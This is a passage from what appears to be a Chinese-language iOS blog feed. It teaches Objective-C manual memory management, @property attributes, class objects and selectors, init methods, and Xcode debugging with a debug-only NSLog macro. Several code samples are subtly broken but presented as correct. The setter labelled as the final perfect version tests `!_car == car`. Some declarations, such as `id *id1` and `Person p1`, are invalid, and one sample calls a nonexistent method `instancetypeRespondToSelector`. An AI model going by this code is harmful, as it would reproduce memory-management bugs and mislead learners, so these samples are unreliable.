                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-22%20%E4%B8%8A%E5%8D%8811.50.55.png" alt="" title="" class="">
                <p></p>
            </figure>
<p>如上图所示的情况也会造成内存的泄漏，因为重新将benz赋值给人的car属性之后，人对象被release掉之后，dealloc中只是让benz的引用计数减一，释放掉了benz对象，但是bmw还有一个计数，所以没有被释放，从而造成内存泄漏。</p>
<p>所以在Person对象的setCar方法中我们需要重新思考:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">- (void)setCar&#123;</div><div class="line">  [_car release];</div><div class="line">  _car = [car retain];</div><div class="line">  //当我们将传入的对象复制给car属性的时候</div><div class="line">  //代表1:_car属性原本指向的对象少一个人使用</div><div class="line">  //代表2:传入的对象多一个人使用</div><div class="line">  //所以我们要把_car属性原本指向的对象先release</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以，如果属性是OC对象的时候，setter方法按照上面的写法还是会发生内存泄漏，我们为属性赋值的时候，代表旧对象少一个人使用，新对象多一个人使用，所以要先release掉旧的，再retain新的。</p>
<h2 id="setter方法内存管理（三）"><a href="#setter方法内存管理（三）" class="headerlink" title="setter方法内存管理（三）"></a>setter方法内存管理（三）</h2><p>当新旧对象是同一个对象的时候也会出现僵尸对象错误：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Person *p1 = [Person new];</div><div class="line">Car *bmw = [Car new];//car对象计数为一</div><div class="line">bmw.speed = 100;</div><div class="line">p1.car = bmw;//car对象计数为二</div><div class="line">[bmw release];//car对象计数为一</div><div class="line">bmw.speed = 200;</div><div class="line">p1.car = bmw;</div><div class="line">[p1 release];//car对象计数减一，被释放，再加一，引用僵尸对象，报错。</div></pre></td></tr></table></figure>
<p>解决的方案：当发现新旧对象是同一个对象的时候，什么都不用做</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//这才是最终完美版的setter方法的写法。</div><div class="line">- (void)setCar:(Car *)car&#123;</div><div class="line">  if(!_car == car)&#123;</div><div class="line">    [_car release];</div><div class="line">    _car = [car retain];</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后特别注意，内存管理的范围是OC的对象，所以只有属性的类型是OC对象的时候，对应的setter方法才需要像那样写，如果不是，直接赋值即可。</p>
<h2 id="property参数概述"><a href="#property参数概述" class="headerlink" title="@property参数概述"></a>@property参数概述</h2><p>因为@property会自动生成私有属性和对应的getter,setter方法的声明和实现，但是在生成的setter方法中，无论是什么类型的都是直接赋值。</p>
<p><strong>@property的参数：</strong></p>
<p>1.格式：</p>
<p>@property(参数1,参数2……)数据类型 名称;</p>
<p>2.介绍一下@property的四组参数：</p>
<ul>
<li>与多线程相关的参数</li>
</ul>
<blockquote>
<p>atomic、nonatomic</p>
</blockquote>
<ul>
<li>与生成的setter方法相关的参数</li>
</ul>
<blockquote>
<p>assign、retain</p>
</blockquote>
<ul>
<li>与生成只读，读写相关的参数</li>
</ul>
<blockquote>
<p>readonly、readwrite</p>
</blockquote>
<ul>
<li>与生成getter,setter方法名字相关的参数</li>
</ul>
<blockquote>
<p>getter、setter</p>
</blockquote>
<p><strong>与多线程相关的参数</strong>：</p>
<p>atomic:默认值，如果写atomic,这个时候生成的setter方法的代码就会加上一把线程安全锁，特点就是安全但是效率低。</p>
<p>nonatomic:生成的setter方法不会加上线程安全锁，但是效率高。建议使用这种。</p>
<p><strong>与生成的setter方法相关的参数</strong>：</p>
<p>assign：生成的setter方法是自动赋值</p>
<p>retain：生成的setter方法是标准的MRC内存管理代码</p>
<p>⚠️：retain参数只是生成标准的setter方法，没有自动的生成dealloc中的release代码，所以我们还需要手动的在dealloc中去release.</p>
<p><strong>与生成只读，读写的封装</strong>:</p>
<p>readwrite:默认值，会自动的生成getter和setter方法</p>
<p>readonly:只会生成getter</p>
<p><strong>生成getter,setter方法名称相关的参数</strong>：</p>
<p>默认情况下，@property生成的getter和setter方法生成的都是最标准的名字</p>
<p>其实我们可以通过参数来制定getter和setter方法指定的名字。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">@property (nonatomic, assign, getter=xxx) int age;</div><div class="line">//此时对应的getter方法变为了-(int)xxx;</div><div class="line">@property(nonatomic, assign, setter=ooo:) int age;</div><div class="line">//因为setter方法是带参数的，所以要加一个冒号</div></pre></td></tr></table></figure>
<p>在修改了getter和setter方法的名字以后，使用点语法，编译器就会默认调用重命名之后的方法。</p>
<p>一般而言，无论在什么情况下都不会改setter方法的名字，当属性的类型是一个BOOL类型的时候，就修改这个getter方法的名字以is开头，提高代码的阅读性。</p>
<p>g</p>
<h2 id="class"><a href="#class" class="headerlink" title="@class"></a>@class</h2><p>当两个类相互包含的时候，当Person.h中包含Book.h,而Book.h又包含Person.h的时候，就会出现循环引用的问题，就会造成无限递归，导致编译无法通过。</p>
<p>所以当出现这种情况的时候，为了避免循环引用，其中一边不要使用<code>#import</code>引入对方的头文件，而是使用<code>@class</code>类名，来标注这是一个类，这样子就可以在不引入对方的头文件的情况下，告诉编译器这是一个类。然后在.m文件中再<code>#import</code>对方的头文件就可以使用了</p>
<p><strong>@class和#import的区别</strong>：</p>
<ul>
<li>import是将指定文件的内容拷贝到写指令的地方</li>
<li>@class并不会拷贝任何内容，只是告诉编译器这是一个类</li>
</ul>
<h2 id="循环retain"><a href="#循环retain" class="headerlink" title="循环retain"></a>循环retain</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-22%20%E4%B8%8B%E5%8D%884.55.31.png" alt="屏幕快照 2017-06-22 下午4.55.31.png" title="" class="">
                <p>屏幕快照 2017-06-22 下午4.55.31.png</p>
            </figure>
<p>出现这种情况的时候，因为两个对象循环引用，A对象的属性是B对象，B对象的属性是A属性，所以两个都无法触发dealloc方法，所以会导致内存泄漏。</p>
<p>解决的方案就是一端使用retain，另一段使用assign即可，使用assign的一段在dealloc方法中就不需要release了。</p>
]]></content>
      
        <categories>
            
            <category> 内存管理 MRC </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[OC特有语法]]></title>
      <url>/2017/06/21/OC%E7%89%B9%E6%9C%89%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>OC特有语法<br><a id="more"></a></p>
<h2 id="子类在内存中的存储和方法调用过程"><a href="#子类在内存中的存储和方法调用过程" class="headerlink" title="子类在内存中的存储和方法调用过程"></a>子类在内存中的存储和方法调用过程</h2><p>1.子类对象中有自己的属性和所有父类的属性</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-17%20%E4%B8%8B%E5%8D%8811.23.35.png" alt="屏幕快照 2017-06-17 下午11.23.35.png" title="" class="">
                <p>屏幕快照 2017-06-17 下午11.23.35.png</p>
            </figure>
<p>2.除去NSObject类之外代码段中的每一个类都有一个isa指针指向它的父类，在继承中，代码段中也是通过这样的指针来调用父类的方法和属性。</p>
<p>在调用方法的时候，根据isa指针一层一层的往上寻找，一直到NSObject为止，如果NSObject也没有就会报错。</p>
<hr>
<h2 id="结构体和类的不同点"><a href="#结构体和类的不同点" class="headerlink" title="结构体和类的不同点"></a>结构体和类的不同点</h2><ul>
<li>结构体只能封装数据，而类不仅可以封装数据还可以封装行为</li>
<li>结构体变量分配在栈中（如果是一个局部变量的情况下）而对象分配在堆中</li>
</ul>
<p>​        栈的特点：空间相对较小，但是存储在栈中的数据访问效率更高一些</p>
<p>​    堆的特点：空间相对较大，但是存储在堆中的数据访问效率更低一些</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//赋值对比</div><div class="line">//值赋值</div><div class="line">Student s1 = &#123;&quot;jack&quot;,19&#125;;</div><div class="line">Student s2 = s1;</div><div class="line">//地址赋值</div><div class="line">Person *p1 = [Person new];</div><div class="line">Person *p2 = p1;</div></pre></td></tr></table></figure>
<p>​</p>
<hr>
<p>​</p>
</li>
</ul>
<h2 id="类的存储"><a href="#类的存储" class="headerlink" title="类的存储"></a>类的存储</h2><ul>
<li><p>类在第一次被访问的时候，类就会被加载到代码段存储，被称为类加载。</p>
</li>
<li><p>类在被加载到代码段之后，除非程序结束不然不会被回收</p>
</li>
<li><p>类存储在代码段中的形式：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-18%20%E4%B8%8B%E5%8D%8812.34.56.png" alt="屏幕快照 2017-06-18 下午12.34.56.png" title="" class="">
                <p>屏幕快照 2017-06-18 下午12.34.56.png</p>
            </figure></p>
<p>1.先在代码段中创建一个Class对象，Class是Foundation框架中的一个类，</p>
<p>这个Class对象就是用来存储类信息。</p>
<p>2.将类的信息存储在这个Class对象当中</p>
<blockquote>
<p>这个Class对象至少有三个属性</p>
<p>类名：存储这个类的名称</p>
<p>属性：存储这个类具有哪些属性</p>
<p>方法：存储这个类具有哪些方法</p>
</blockquote>
<p>所以存储类的类对象也有一个叫做isa指针的属性，这个指针指向存储父类的对象。</p>
</li>
</ul>
<hr>
<h2 id="类对象的使用"><a href="#类对象的使用" class="headerlink" title="类对象的使用"></a>类对象的使用</h2><p>1.调用类的类方法 class 就可以得到存储类的类对象地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">//声明Class指针的时候不需要加* ，因为在typedef的时候已经加上了*</div><div class="line">Class c1 = [Person class];</div><div class="line">NSLog(@&quot;%p&quot;,c1);</div></pre></td></tr></table></figure>
<p>2.调用对象的对象方法class就可以得到存储这个对象所属的类的Class对象的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Person *p1 = [Person new];</div><div class="line">Class c2 = [p1 class];</div><div class="line">NSLog(@&quot;%p&quot;,c2);</div></pre></td></tr></table></figure>
<p>3.对象中的isa指针的值其实就是代码段中存储类的类对象的地址</p>
<p>4.类对象的使用 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Class c1 = [Person class];</div><div class="line">//此时c1就是指向了Person这个类,可以直接调用类方法。</div><div class="line">[c1 sayHi];</div><div class="line">//可以使用使用类对象来调用new方法，创建存储在类对象中的类的对象</div><div class="line">c1 *p2 = [c1 new];</div><div class="line">//类对象不能用来调用实例方法，但是可以用来调用类方法</div></pre></td></tr></table></figure>
<hr>
<h2 id="方法本质是SEL消息"><a href="#方法本质是SEL消息" class="headerlink" title="方法本质是SEL消息"></a>方法本质是SEL消息</h2><p>SEL的全称是叫做selector 选择器，是一个数据类型，所以要在内存中申请空间存储数据。</p>
<p>SEL其实是一个类，SEL对象是用来存储方法的</p>
<p>由此可知方法在类对象中的存储方式：</p>
<p>1.创建一个SEL对象</p>
<p>2.方法存储在SEL对象之中</p>
<p>3.SEL对象再作为Class对象的一个属性</p>
<p><strong>拿到存储方法的SEL对象</strong></p>
<ul>
<li><p>因为SEL是个typedef类型，在自定义的时候已经加<em>了，所以我们在声明SEL指针的时候，不需要加 </em>。</p>
</li>
<li><p>取到存储方法的SEL 对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SEL s1 = @selector(方法名);</div></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>调用方法的本质</strong></p>
<ul>
<li>先拿到存储方法的对象，也就是拿到存储方法的SEL数据，SEL消息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//向p1对象发送一条SEL消息</div><div class="line">[p1 sayHi];</div></pre></td></tr></table></figure>
<ul>
<li>将这个SEL消息发送给对象</li>
<li>这个时候对象接收到消息之后就知道要调用方法</li>
<li>根据对象的isa指针找到存储类的类对象</li>
<li>找到这个类对象之后，在这个类对象中去搜寻是否有和传入的SEL数据相匹配的，如果有就执行，没有就再找父类，直到NSObject为止。</li>
</ul>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-19%20%E4%B8%8A%E5%8D%8810.28.46.png" alt="屏幕快照 2017-06-19 上午10.28.46.png" title="" class="">
                <p>屏幕快照 2017-06-19 上午10.28.46.png</p>
            </figure>
<ul>
<li>手动向对象发送SEL消息：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Person p1 = [Person new];</div><div class="line">SEL s1 = @selector(sayHi);</div><div class="line">[p1 performSelector:s1];</div></pre></td></tr></table></figure>
<hr>
<h2 id="点语法"><a href="#点语法" class="headerlink" title="点语法"></a>点语法</h2><p>点语法的原理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p1.age = 18;</div><div class="line">//这句话的本质不是直接把18赋值给p1对象的_age属性</div></pre></td></tr></table></figure>
<ul>
<li>当使用点语法赋值的时候，编译器会将点语法转换为调用setter方法的代码：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">//编译器会将下面这句代码转换为它的setter方法</div><div class="line">p1.age = 10;</div><div class="line">[p1 setAge:10];</div></pre></td></tr></table></figure>
<ul>
<li>当使用点语法取值的时候 ，编译器会将点语法转换为调用getter方法的代码：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">//编译器会将下面这句代码转换为它的getter方法</div><div class="line">NSString *name = p1.name;</div><div class="line">NSString *name = [p1 name];</div></pre></td></tr></table></figure>
<p>⚠️：在getter、setter方法中慎用点语法，因为有可能会造成无限递归 而程序崩溃:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">- (void)setAge:(int)age&#123;</div><div class="line">  self.age = age;</div><div class="line">  //[self setAge:age];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="property和-synthesize"><a href="#property和-synthesize" class="headerlink" title="@property和@synthesize"></a>@property和@synthesize</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">@interface Person: NSObject</div><div class="line">  &#123;</div><div class="line">    int _age;</div><div class="line">  &#125;</div><div class="line">@property int age;</div><div class="line">@end</div><div class="line">----</div><div class="line">@implementation Person</div><div class="line">  </div><div class="line">@synthesize age;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<p>@property只是对属性的getter和setter方法做了一个声明，还要在.m文件中通过@synthesize来实现。</p>
<p><strong>@synthesize的作用</strong></p>
<p>1.生成一个真私有属性方法，属性的类型名字都和它对应的@property一致。</p>
<p>2.自动生成setter方法，将参数赋给那个自动生成的私有属性 </p>
<p>3.自动生成getter方法，将生成的属性的值返回</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">//@synthesize做的事情等价于下面的代码</div><div class="line">@implementation Person</div><div class="line">  &#123;</div><div class="line">    int age;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">-(void)setAge&#123;</div><div class="line">  self-&gt;age = age;</div><div class="line">&#125;</div><div class="line"></div><div class="line">-(int)age&#123;</div><div class="line">  return self-&gt;age;</div><div class="line">&#125;</div><div class="line">@end</div></pre></td></tr></table></figure>
<p>这就意味着之前声明的私有属性没有任何的作用了，可以去掉，现在是直接在@property中声明属性，然后在@synthesize中生成getter和setter方法。</p>
<p><strong>但是从Xcode4.4之后</strong>，对于@property做了增强，只需要写一个@property，编译器就会自动的生成私有属性和getter和setter的声明和实现。</p>
<p>所以升级之后下面的代码含义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@property NSString *name;</div><div class="line">//自动生成1个私有属性，类型和名称和@property一致，属性的名称前面自动加一个下划线。</div><div class="line">//自动生成这个这个属性的getter和setter方法的声明和实现</div></pre></td></tr></table></figure>
<p><strong>使用注意</strong>：</p>
<ul>
<li>@property类型一定要和属性的类型一致，名字也要一致，只是去掉下划线</li>
<li>@property生成的方法没有做任何的逻辑验证，都是直接赋值或者直接返回，所以我们可以通过重写setter方法来自定义验证逻辑。</li>
<li>重写setter方法的时候会自动生成getter方法，重写getter方法的时候会自动重写getter方法，如果两个同时重写将不会自动生成私有属性</li>
<li>@property生成的是私有属性，父类的@property属性可以被子类继承，但是在子类的内部无法被访问，只能通过getter和setter方法</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//在子类中访问父类的属性</div><div class="line">- (void)test&#123;</div><div class="line">  [super setName:@&quot;jack&quot;];</div><div class="line">  //或者使用</div><div class="line">  self.name = @&quot;jack&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="静态类型和动态类型"><a href="#静态类型和动态类型" class="headerlink" title="静态类型和动态类型"></a>静态类型和动态类型</h2><p>OC是一门弱语言</p>
<p>编译器在编译的时候，检查没有那么严格</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> num = <span class="number">12.12</span>;</div></pre></td></tr></table></figure>
<p>但是在运行的时候会报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">NSString *str = [Pig new];</div><div class="line">//实际上没有length这个方法，但是编译不会出现问题</div><div class="line">[str length];</div></pre></td></tr></table></figure>
<p>静态类型和动态类型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//一个指针指向的对象是本类的对象</div><div class="line">Animal *a1 = [Animal new];</div><div class="line">//动态类型指的是编译的时候不确定他的实际类型，只有在运行的时候才会真实确定他的类型</div><div class="line">NSString *arr = @&quot;123456&quot;;</div><div class="line">UIButton *button = (UIButton *)arr;</div><div class="line">//只有在程序运行的时候才会真实确定变量的真实类型。</div><div class="line">NSLog(@&quot;%@&quot;,button);</div></pre></td></tr></table></figure>
<p><strong>编译检查</strong></p>
<p>编译器的名称叫做LLVM</p>
<p>编译器在编译的时候，能不能通过指针去调用指针指向对象的方法</p>
<p>判断原则：判断这个指针所属的类型中有没有此方法，如果有就编译通过，如果这个类没有就编译报错</p>
<p>这个叫做编译检查，在编译的时候，能不能通过调用对象的方法主要是看指针的类型。</p>
<p>我们可以将指针的类型做转换，来达到骗过编译器的目的</p>
<p><strong>运行检查</strong></p>
<p>编译检查只是骗过了编译器，但是在运行的时候还会进行一次检查。</p>
<p>如果对象中真的有这个方法才会执行，否则报错</p>
<p><strong>LSP</strong></p>
<p>父类指针指向子类对象。</p>
<p>实际上任意的指针可以执行任意的对象，编译器是不会报错的。</p>
<p>当一个子类指针执行父类对象的时候，编译器运行通过子类指针去调用子类独有的方法，但是在运行的时候会出问题。</p>
<hr>
<h2 id="NSObject和id指针"><a href="#NSObject和id指针" class="headerlink" title="NSObject和id指针"></a>NSObject和id指针</h2><p><strong>1.NSObject</strong></p>
<p>是所有类的基类，根据LSP，NSObject可以指向任意的OC对象，所以NSObject指针是一个万能指针</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//声明一个NSObject指针，然后让指针的类型改变成为Person类型的</div><div class="line">NSObject *obj = [Person new];</div><div class="line">//需要做一个类型转换，不然无法通过编译检查</div><div class="line">[(Person *)obj sayHi];</div></pre></td></tr></table></figure>
<p><strong>2.id指针</strong></p>
<p>万能指针，可以指向任何的OC 对象</p>
<p>1.id是一个typedef类型，在自定义的时候已经加上了*</p>
<p>2.id指针是一个万能指针，任何OC对象都可以指</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">id *id1 = [Person new];</div><div class="line">[id1 sayHi];</div></pre></td></tr></table></figure>
<p><strong>3.二者的异同</strong></p>
<p>同：万能指针 都可以执行任意的OC对象</p>
<p>异：如果指针是id类型的，在编译检查的时候直接通过</p>
<p>⚠️：id不能使用点语法，只能调用方法，不然编译器会直接报错，如果要使用万能指针，就选择使用id，方便很多。</p>
<p><strong>4.父类创建一个类方法返回父类对象</strong></p>
<ul>
<li>如果返回值写为父类类型，那么子类来调用这个方法得到的就是父类指针，解决的方式就是把返回值改成id类型。</li>
<li>方法内部创建的对象不能写死。</li>
<li>如果方法的返回值是id，问题就是任意指针都可以接受这个方法的返回值，编译器连警告都没有，如果方法的返回值是instancetype，那么代表的是当前这个类的对象。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">+ (instancetype)person&#123;</div><div class="line">  return [self new];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="动态类型检测"><a href="#动态类型检测" class="headerlink" title="动态类型检测"></a>动态类型检测</h2><p>我们写的程序就算是编译通过了，不意味着可以完美执行，所以我们希望可以判断一下对象中是否有这个方法，如果有再执行。</p>
<p>1.判断指针指向的对象是否有这个方法可以执行（只能判断对象方法）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Person *p1 = [Person new];</div><div class="line">BOOL b1 = [p1 respondsToSelector:@selector(length)];</div><div class="line">if(b1)&#123;</div><div class="line">  [p1 sayHi];</div><div class="line">&#125;else&#123;</div><div class="line">  NSLog(@&quot;NO。。。。。&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>2.判断指定的对象是不是指定的类或者指定的类的子类的实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Student *s1 = [Student new];</div><div class="line">BOOL b1 = [s1 isKindOfClass:[Person class]];</div></pre></td></tr></table></figure>
<p>3.只能判断本类不包括子类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BOOL b1 = [s1 isMemberOfClass:[Person class]];</div></pre></td></tr></table></figure>
<p>4.判断一个类是否是另一个类的子类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[Student isSubclassOfClass:[Person class]];</div></pre></td></tr></table></figure>
<p>5.判断指定的类中有没有对应的类方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[Student instancetypeRespondToSelector:@selector(sayHi)];</div></pre></td></tr></table></figure>
<hr>
<h2 id="构造方法概述"><a href="#构造方法概述" class="headerlink" title="构造方法概述"></a>构造方法概述</h2><p><strong>new方法</strong>：</p>
<p>new方法的内部，其实是先调用alloc方法，再调用的init方法。</p>
<p>alloc 是一个类方法，那一个类的调用的这个方法，就创建哪一个类的对象，并将其返回</p>
<p>init方法是一个对象方法，用来初始化对象。</p>
<p>虽然没有初始化的对象有时候也可以用来使用，但是千万不要这么做，使用一个未初始化的对象很危险，如果有一个属性是指针，就会指向了未知的内存空间。</p>
<p><strong>init方法</strong>：</p>
<p>作用是为对象的属性赋初始值，这个init方法我们叫做构造方法</p>
<p>所以，就算我们没有赋值，属性也是有默认值的。</p>
<p>如果想要在初始化的时候给属性赋上自定义的值，就可以重写init构造方法。</p>
<p>重写规范：</p>
<ul>
<li>必须要先调用父类的init方法，然后将方法的返回值赋值给self</li>
<li>调用init方法初始化对象可能会失败，失败则会返回nil</li>
<li>判断父类是否初始化成功，成功则初始化当前对象的属性</li>
<li>最后返回self的值</li>
</ul>
<p><strong>Reason</strong>:</p>
<ul>
<li>为什么要调用父类的init方法？</li>
</ul>
<p>因为父类的init方法会初始化父类的属性，所以必须要保证当前对象的父类属性也被初始化</p>
<ul>
<li>为什么要赋值给self?</li>
</ul>
<p>因为，调用父类的init方法，实际上返回的就是当前对象，但是我们要判断是否初始化成功。</p>
<p><strong>一些问题</strong>：</p>
<p>重写了init方法之后，每一次创建出来的对象的属性都是一样的。希望可以由创建对象的人来指定，而不是写死在init方法之中。同时我们需要遵循以下规范：</p>
<ul>
<li>自定义构造方法的返回值必须是instancetype</li>
<li>自定义的构造方法的名称必须以initWith开头</li>
<li>方法的实现和init的要求一样</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">- (instancetype)initWithAge:(int)age&#123;</div><div class="line">  if(self = [super init])&#123;</div><div class="line">    self.age = age;</div><div class="line">  &#125;</div><div class="line">  return self;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> OC特有语法 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Xcode基本调试]]></title>
      <url>/2017/06/20/Xcode%E5%9F%BA%E6%9C%AC%E8%B0%83%E8%AF%95/</url>
      <content type="html"><![CDATA[<p>Xcode基本调试<br><a id="more"></a></p>
<h1 id="Xcode基本调试法"><a href="#Xcode基本调试法" class="headerlink" title="Xcode基本调试法"></a>Xcode基本调试法</h1><p><strong>1. 运行时设置断点</strong></p>
<p>在XCode中需要观察的变量所在的代码处添加断点，可以让程序运行到这里暂停。这时鼠标悬停在变量名处，XCode会显示出该变量的信息。</p>
<p>断点的类型分为异常断点（Exception Breakpoint）和符号断点（Symbolic Breakpoint）等，在XCode断点浏览器（Breakpoints Navigator）的左下方可以添加这些断点。</p>
<p>符号断点中的符号可以指方法名称或函数名称。符号断点可以中断某个函数的调用。用户还可以添加执行断点的条件。</p>
<p><strong>2.打印到控制台</strong></p>
<p>控制台位于XCode的底端，用于打印程序运行过程中的输出信息。在代码中调用NSLog函数，可以打印变量值到控制台中显示出来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">NSLog(@&quot;obj:%@&quot;, obj);</div></pre></td></tr></table></figure>
<p>需要特别注意的是，尽管NSLog可圈可点，但在实际应用中要防备其可能会引起安全问题，因为任何由NSLog输出的内容都会成为应用程序成品代码</p>
<p>的一部分，也就是说会被任何接触到应用的人看到。只要把设备接入信息管理工具，每个人都能查看控制台信息并查询每一条日志记录。这可能会引发一系列严重后</p>
<p>果，例如向控制台输出机密逻辑算法或者用户密码等信息。</p>
<p>我们可以使用宏来解决调用NSLog方法可能导致的安全问题，只在调试版本中调用NSLog。可以采用全局可访问的头文件，把所有日志记录都灌进去，而且不用担心它们会出现在成品代码当中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#ifdef DEBUG</div><div class="line"></div><div class="line">#define DMLog(...) NSLog(@&quot;%s %@&quot;, PRETTY_FUNCTION, [NSString stringWithFormat:VA_ARGS])</div><div class="line"></div><div class="line">#else</div><div class="line"></div><div class="line">#define DMLog(...) do &#123; &#125; while (0)</div></pre></td></tr></table></figure>
